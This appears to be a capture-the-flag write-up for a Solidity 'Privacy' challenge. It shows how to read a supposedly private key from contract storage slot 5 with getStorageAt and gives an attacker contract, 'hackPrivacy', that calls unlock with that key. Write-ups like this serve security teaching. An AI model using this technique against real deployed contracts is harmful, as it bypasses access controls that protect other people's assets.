Our goal here is to unlock the contract

The only way to unlock the contract is to know what is at `data[2]`

```solidity
    function unlock(bytes16 _key) public {
            require(_key == bytes16(data[2]));
            locked = false;
    }
```

We can get the data using following code

```javascript
const address = "0x123..."; // contract address
const slot = 5;
const data2 = await provider.getStorageAt(address, slot);
console.log(data2); // returns as a hex string
```

By calculation you can findout `slot 5` is used to store `data[2]`, which i have used above.

Once we get the data, it can be used as below

```solidity
    contract hackPrivacy{
        bytes32 value = 0x052e296313b2b0e141a00887a572b8e7e90b7dffc0f70ff438d91bd078f03360;
        bytes16 password = bytes16(value);

        Privacy privacy;

        constructor(address _privacy){
            privacy = Privacy(_privacy);
        }

        function attack() public{
            privacy.unlock(password);
        }
    }
```

by substituting the value you've got in `value` you can unlock.
